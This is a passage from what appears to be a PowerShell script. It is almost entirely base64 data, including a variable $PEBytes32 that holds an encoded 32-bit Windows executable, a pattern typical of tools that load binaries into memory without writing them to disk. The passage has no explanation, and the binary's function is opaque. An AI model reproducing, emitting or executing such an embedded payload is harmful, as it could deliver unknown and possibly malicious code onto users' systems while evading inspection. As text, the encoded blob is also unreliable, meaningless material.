IqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir4KvwqwCsEKwgrDCsQKxQrGCscKyArJCsoKywrMCs0KzgrPCsAK0QrSCtMK1ArVCtYK1wrYCtkK2grbCtwK3QreCt8K0ArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvAHABAEwBAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKoAkAEA0AAAAIChiKGQoZihoKGoobChuKHAocih0KHYoeCh6KHwofihAKIIohCiGKIgoiiiMKI4okCiSKJQoliiYKJoonCieKKAooiikKKYoqCiqKKworiiwKLIotCi2KLgouii8KL4ogCjCKMQoxijIKMoozCjOKNAo0ijUKNYo2CjaKNwo3ijgKOIo5CjmKOgo6ijsKO4o8CjyKPQo9ij4KPoo/Cj+KMApAikEKQYpCCkKKQwpDikQKRIpFCkWKRgpGikcKR4pICkiKSQpAAAAKABAAwAAAD4qAAAANABALQAAAAgoDCgUKVYpcCnyKfQp9in4Kfop/Cn+KcAqAioQK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QryCvKK8wrzivQK9Ir1CvWK9gr2ivcK94r4CviK+Qr5ivoK+or7CvuK/Ar8iv0K/Yr+Cv6K/wr/ivAOABAMAAAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgyKDooAihKKFIoYChmKGgoaihsKH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQopDCkOKRApEikUKRYpGCkcKR4pICkuKTIp9Cn2KfgpwioMKhYqICoqKjIqPCoKKlgqZCpAAAAAAAAAAAAAAAAAAAAAA=='
    $PEBytes32 = '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